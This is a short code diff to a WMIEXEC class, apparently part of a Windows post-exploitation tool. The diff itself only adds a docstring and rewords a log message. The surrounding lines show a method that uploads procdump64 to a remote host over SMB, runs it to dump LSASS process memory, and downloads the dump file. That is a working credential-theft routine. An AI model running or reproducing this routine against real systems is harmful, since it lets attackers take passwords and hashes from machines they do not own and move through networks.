@@ -249,6 +249,10 @@ class WMIEXEC:
 
 
     def dump(self):
+        """Dump lsass and retrieve output dmp file.
+
+        Thanks https://gist.githubusercontent.com/knavesec/0bf192d600ee15f214560ad6280df556/raw/36ff756346ebfc7f9721af8c18dff7d2aaf005ce/autoProc.py
+        """
         self.__remoteshell = RemoteShell(self.__share, self.__win32Process, self.__smbconnection)
 
         self.logger.announce('Uploading procdump64')
@@ -260,7 +264,7 @@ class WMIEXEC:
         self.__remoteshell.onecmd('procdump64.exe -ma -accepteula lsass safe.dmp')
         time.sleep(8)
         
-        self.logger.announce('Downloading test.dmp to current directory')
+        self.logger.announce('Downloading dump file to current directory')
         self.__remoteshell.do_get('safe.dmp')
 
         self.logger.success('Finished, now cleaning up on target')
